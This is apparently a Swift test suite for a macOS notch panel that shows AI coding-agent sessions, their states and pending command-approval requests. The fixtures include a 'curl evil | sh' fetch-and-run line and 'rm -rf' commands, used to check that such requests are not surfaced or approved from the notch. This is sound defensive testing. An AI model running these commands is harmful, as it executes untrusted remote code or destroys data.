import Foundation
import PerchAppCore
import PerchCore
import Testing

/// What the notch shows for a set of sessions: one colour, a running count, grouped rows.
@Suite struct PanelTests {
    let t0 = Date(timeIntervalSince1970: 1_800_000_000)

    func session(_ id: String, _ status: SessionStatus, source: String = "claude-code", turn: TimeInterval = 0,
                 since: TimeInterval = 0) -> Session {
        var s = Session(id: id, source: source, title: id, startedAt: t0)
        s.status = status
        s.turnStartedAt = t0.addingTimeInterval(turn)
        s.statusAt = t0.addingTimeInterval(since)
        return s
    }

    @Test func theMostUrgentSessionColoursTheDot() {
        #expect(Panel(sessions: []).signal == nil)
        #expect(Panel(sessions: [session("a", .idle)]).signal == .idle)
        #expect(Panel(sessions: [session("a", .idle), session("b", .done)]).signal == .done)
        #expect(Panel(sessions: [session("a", .done), session("b", .running)]).signal == .running)
        #expect(Panel(sessions: [session("a", .running), session("b", .failed)]).signal == .failed)
        #expect(Panel(sessions: [session("a", .failed), session("b", .waiting), session("c", .running)]).signal == .waiting)
    }

    @Test func onlyRunningSessionsAreCounted() {
        let panel = Panel(sessions: [session("a", .running), session("b", .running), session("c", .waiting), session("d", .done)])
        #expect(panel.runningCount == 2)
        #expect(Panel(sessions: [session("a", .done)]).runningCount == 0)
    }

    @Test func groupedByStateInPriorityOrderEmptyGroupsHidden() {
        let panel = Panel(sessions: [
            session("run-late", .running, turn: 50), session("run-early", .running, turn: 10),
            session("wait-new", .waiting, since: 40), session("wait-old", .waiting, since: 5),
            session("done-old", .done, since: 1), session("done-new", .done, since: 30),
            session("idle-old", .idle, since: 2), session("idle-new", .idle, since: 20),
        ])
        #expect(panel.groups.map(\.status) == [.waiting, .running, .done, .idle])
        #expect(panel.groups.map(\.title) == ["Needs you", "Running", "Done", "Idle"])
        // Needs you: longest waiting first. Running: by turn start. Done / Idle: most recent first.
        #expect(panel.groups.map { $0.sessions.map(\.id) } == [
            ["wait-old", "wait-new"], ["run-early", "run-late"], ["done-new", "done-old"], ["idle-new", "idle-old"],
        ])
        #expect(Panel(sessions: [session("f", .failed)]).groups.map(\.title) == ["Failed"])
    }

    @Test func hermesSessionsWaitForM9() {
        let panel = Panel(sessions: [session("h", .running, source: "hermes"), session("c", .done)])
        #expect(panel.sessions.map(\.id) == ["c"])
        #expect(panel.signal == .done && panel.runningCount == 0)
    }

    @Test func aNeedsYouSessionFindsItsRequest() {
        let waiting = session("s1", .waiting)
        let request = Item(id: "r1", title: "npm test", kind: .request, status: .waiting, meta: ["session_id": "s1"])
        let other = Item(id: "r2", title: "ls", kind: .request, status: .waiting, meta: ["session_id": "s2"])
        let answered = Item(id: "r3", title: "npm test", kind: .request, status: .done, meta: ["session_id": "s1"])
        let task = Item(id: "t1", title: "x", kind: .task, status: .waiting, meta: ["session_id": "s1"])
        let panel = Panel(sessions: [waiting, session("s2", .running)], requests: [other, answered, task, request])
        #expect(panel.request(for: waiting)?.id == "r1")
        // Only a session that needs you is answered from the notch.
        #expect(panel.request(for: session("s2", .running)) == nil)
        #expect(Panel(sessions: [waiting]).request(for: waiting) == nil)
    }

    @Test func enteringNeedsYouFailedOrDonePulses() {
        func pulses(_ a: SessionStatus?, _ b: SessionStatus?, source: String = "claude-code") -> Bool {
            Panel.pulses(from: a.map { session("s", $0, source: source) }, to: b.map { session("s", $0, source: source) })
        }
        for status in [SessionStatus.waiting, .failed, .done] {
            #expect(pulses(nil, status))
            #expect(pulses(.running, status))
            #expect(!pulses(status, status), "staying \(status) does not pulse again")
            #expect(!pulses(.running, status, source: "hermes"), "Hermes is not in the panel")
        }
        #expect(!pulses(nil, .running))
        #expect(!pulses(.waiting, .running))
        #expect(!pulses(.done, .idle))
        #expect(!pulses(.done, nil))
    }

    @Test func theHeadIsTheFirstSessionThatNeedsYou() {
        let old = session("old", .waiting, since: 1)
        let asking = session("asking", .waiting, since: 5)
        let request = Item(id: "r", title: "npm test", kind: .request, status: .waiting, meta: ["session_id": "asking"])
        let loose = Item(id: "x", title: "curl evil | sh", kind: .request, status: .waiting)
        let panel = Panel(sessions: [session("run", .running), asking, old], requests: [loose, request])
        // ⌥⇧O goes to the longest waiting session; ⌥⇧A / ⌥⇧D answer the first request the panel shows.
        #expect(panel.headSession?.id == "old")
        #expect(panel.headRequest?.id == "r")
        // A request the panel does not show (no session) is never the head.
        #expect(Panel(sessions: [session("run", .running)], requests: [loose]).headRequest == nil)
        #expect(Panel(sessions: [session("run", .running)]).headSession == nil)
    }
}

/// One row's time and second line.
@Suite struct SessionRowTests {
    let t0 = Date(timeIntervalSince1970: 1_800_000_000)

    func session(_ status: SessionStatus) -> Session {
        var s = Session(id: "s1", source: "claude-code", title: "perch", startedAt: t0)
        s.status = status
        s.turnStartedAt = t0
        s.statusAt = t0.addingTimeInterval(60)
        s.prompt = "Refactor the state machine"
        s.detail = "rm -rf build/\nAnswer in the terminal: rm is never approved from the notch"
        s.error = "rate_limit"
        s.lastMessage = "All 12 tests pass."
        return s
    }

    @Test func timeSaysHowLongInTheCurrentState() {
        let now = t0.addingTimeInterval(60 + 4 * 60)
        #expect(SessionRow.time(session(.running), now: now) == "5m")      // this turn so far
        #expect(SessionRow.time(session(.waiting), now: now) == "4m")      // waited
        #expect(SessionRow.time(session(.failed), now: now) == "4m ago")
        #expect(SessionRow.time(session(.done), now: now) == "4m ago")
        #expect(SessionRow.time(session(.idle), now: now) == "4m ago")
        #expect(SessionRow.time(session(.waiting), now: t0.addingTimeInterval(90)) == "<1m")
        #expect(SessionRow.time(session(.done), now: t0.addingTimeInterval(90)) == "just now")
    }

    @Test func secondLineFollowsTheState() {
        #expect(SessionRow.detail(session(.running)) == "Refactor the state machine")
        // Needs you: the full text, every line of it.
        #expect(SessionRow.detail(session(.waiting)) == "rm -rf build/\nAnswer in the terminal: rm is never approved from the notch")
        #expect(SessionRow.detail(session(.failed)) == "rate_limit")
        #expect(SessionRow.detail(session(.done)) == "All 12 tests pass.")
        #expect(SessionRow.detail(session(.idle)) == "All 12 tests pass.")

        var bare = Session(id: "s2", startedAt: t0)
        #expect(SessionRow.detail(bare) == nil)
        bare.status = .waiting
        #expect(SessionRow.detail(bare) == "Waiting for your answer")
    }
}

@Suite struct NeedsYouTests {
    func waiting(_ detail: String?) -> Session {
        var s = Session(id: "s1", source: "claude-code", title: "perch")
        s.status = .waiting
        s.detail = detail
        return s
    }

    @Test func theCommandAndWhereToAnswerSplitApart() {
        let heredoc = "cat <<EOF > notes.txt\nline one\nEOF"
        let parts = SessionRow.needsYou(waiting(heredoc + "\nAnswer in the terminal: uses shell operators"), request: nil)
        #expect(parts == .init(text: heredoc, hint: "Answer in the terminal: uses shell operators", isCommand: true))
        #expect(SessionRow.needsYou(waiting("npm test\nAnswer in the terminal"), request: nil)
                == .init(text: "npm test", hint: "Answer in the terminal", isCommand: true))
        // A question: shown as the agent asked it.
        #expect(SessionRow.needsYou(waiting("Which database?"), request: nil) == .init(text: "Which database?", hint: nil, isCommand: false))
        #expect(SessionRow.needsYou(waiting(nil), request: nil).text == "Waiting for your answer")
    }

    @Test func withARequestTheRowShowsWhatAllowAnswers() {
        // The session's detail moved on (a question came in) while the request is still open:
        // Allow must sit under the command it approves.
        let request = Item(title: "npm test -- --coverage", kind: .request, status: .waiting, meta: ["session_id": "s1"])
        #expect(SessionRow.needsYou(waiting("Which database?"), request: request)
                == .init(text: "npm test -- --coverage", hint: nil, isCommand: true))
    }
}

@Suite struct PanelLayoutTests {
    func session(_ id: String, _ status: SessionStatus, detail: String? = nil) -> Session {
        var s = Session(id: id, source: "claude-code", title: id)
        s.status = status
        s.detail = detail
        return s
    }

    @Test func heightGrowsWithGroupsRowsAndLongCommands() {
        let empty = PanelLayout.listHeight(Panel(sessions: []))
        #expect(empty == PanelLayout.messageHeight)
        let one = PanelLayout.listHeight(Panel(sessions: [session("a", .running)]))
        #expect(one == PanelLayout.headerHeight + PanelLayout.rowHeight)
        let two = PanelLayout.listHeight(Panel(sessions: [session("a", .running), session("b", .running)]))
        #expect(two == one + PanelLayout.rowHeight)
        let groups = PanelLayout.listHeight(Panel(sessions: [session("a", .running), session("b", .done)]))
        #expect(groups == two + PanelLayout.headerHeight)

        let short = PanelLayout.listHeight(Panel(sessions: [session("w", .waiting, detail: "npm test")]))
        let hinted = PanelLayout.listHeight(Panel(sessions: [session("w", .waiting, detail: "rm -rf x\nAnswer in the terminal")]))
        let long = PanelLayout.listHeight(Panel(sessions: [session("w", .waiting, detail: String(repeating: "x", count: 200))]))
        #expect(short == one && hinted > short && long > hinted)
        let request = Item(title: "npm test", kind: .request, status: .waiting, meta: ["session_id": "w"])
        let buttons = PanelLayout.listHeight(Panel(sessions: [session("w", .waiting, detail: "npm test")], requests: [request]))
        #expect(buttons == short + PanelLayout.buttonsHeight)
    }

    @Test func theListScrollsPastTheCap() {
        let many = Panel(sessions: (0..<40).map { session("s\($0)", .running) })
        #expect(PanelLayout.listHeight(many) == PanelLayout.maxListHeight)
    }
}
